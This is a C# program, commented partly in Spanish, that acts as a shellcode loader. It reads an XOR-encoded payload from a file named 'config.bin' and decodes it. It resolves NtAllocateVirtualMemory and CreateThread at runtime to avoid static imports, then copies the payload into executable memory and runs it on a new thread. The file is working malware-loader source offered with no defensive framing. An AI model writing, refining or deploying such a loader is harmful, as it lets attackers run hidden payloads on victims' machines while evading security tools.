using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ulong ZeroBits,
        ref ulong RegionSize,
        uint AllocationType,
        uint Protect
    );

    private delegate IntPtr CreateThreadDelegate(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    static void Main(string[] args)
    {
        string filePath = "config.bin";

        byte[] encrypted = LoadShellcode(filePath);
        if (encrypted == null)
        {
            Console.WriteLine("Failed to load shellcode.");
            return;
        }

        byte[] shellcode = DeXOR(encrypted, 0xAA);

        // Cargar ntdll.dll y kernel32.dll
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr k32 = LoadLibrary("kernel32.dll");

        // Obtener punteros a las funciones
        IntPtr pNtAlloc = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
        IntPtr pCreateThread = GetProcAddress(k32, "CreateThread");

        // Crear delegates
        NtAllocateVirtualMemoryDelegate NtAlloc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pNtAlloc, typeof(NtAllocateVirtualMemoryDelegate));
        CreateThreadDelegate CreateThread = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThreadDelegate));

        IntPtr baseAddress = IntPtr.Zero;
        ulong regionSize = (ulong)shellcode.Length;
        IntPtr processHandle = (IntPtr)(-1); // pseudo handle (current process)

        // Asignar memoria
        uint result = NtAlloc(
            processHandle,
            ref baseAddress,
            0,
            ref regionSize,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40    // PAGE_EXECUTE_READWRITE
        );

        if (result != 0)
        {
            Console.WriteLine("Memory allocation failed.");
            return;
        }

        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

        // Crear hilo para ejecutar shellcode
        IntPtr hThread = CreateThread(
            IntPtr.Zero,
            0,
            baseAddress,
            IntPtr.Zero,
            0,
            IntPtr.Zero
        );

        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("Thread creation failed.");
            return;
        }

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    private static byte[] LoadShellcode(string filePath)
    {
        try
        {
            return File.ReadAllBytes(filePath);
        }
        catch (Exception e)
        {
            Console.WriteLine("Error reading shellcode: " + e.Message);
            return null;
        }
    }

    private static byte[] DeXOR(byte[] data, byte key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key);
        }
        return result;
    }
}
